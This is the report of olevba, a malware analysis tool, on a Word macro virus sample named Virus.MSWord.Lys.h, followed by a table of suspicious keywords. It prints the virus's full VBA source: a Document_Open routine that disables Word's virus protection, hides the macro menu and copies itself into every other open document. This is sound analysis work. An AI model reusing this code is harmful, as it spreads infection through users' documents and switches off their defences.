olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lys.h-dec15376b206f75eb5d9a645f3f877799dd8a21e
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Lys.h-dec15376b206f75eb5d9a645f3f877799dd8a21e 
in file: Virus.MSWord.Lys.h-dec15376b206f75eb5d9a645f3f877799dd8a21e - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Open()
On Error Resume Next
Application.ScreenUpdating = False: Application.EnableCancelKey = wdCancelDisabled: Options.VirusProtection = False: Options.ConfirmConversions = False
CommandBars("Tools").Controls("Macro").Visible = False
ActiveDocument.VBProject.VBComponents.Item(1).Export ("C:\STM.WIV")
Application.RecentFiles.Item(2).Open
For Z = 1 To Documents.Count
If Documents.Item(Z).FullName <> MacroContainer.FullName Then
With Documents.Item(Z)
.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\STM.WIV")
.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
.Save: .Close: End With: End If: Next
Application.ScreenUpdating = True: Application.EnableCancelKey = wdCancelInterrupt
End Sub
'*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*'
'*~~~STM:~Sexually~Transmitted~Macro~~~*'
'*~~~Unprotected~Documents~May~Carry~~~*'
'*~~~Harmful~And/or~Unwanted~Disease~~~*'
'*STM(WIV:~Word~Immunodeficiency~Virus)*'
'*~~~~~~~~~~~~By~Lys~KovicK~~~~~~~~~~~~*'
'*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

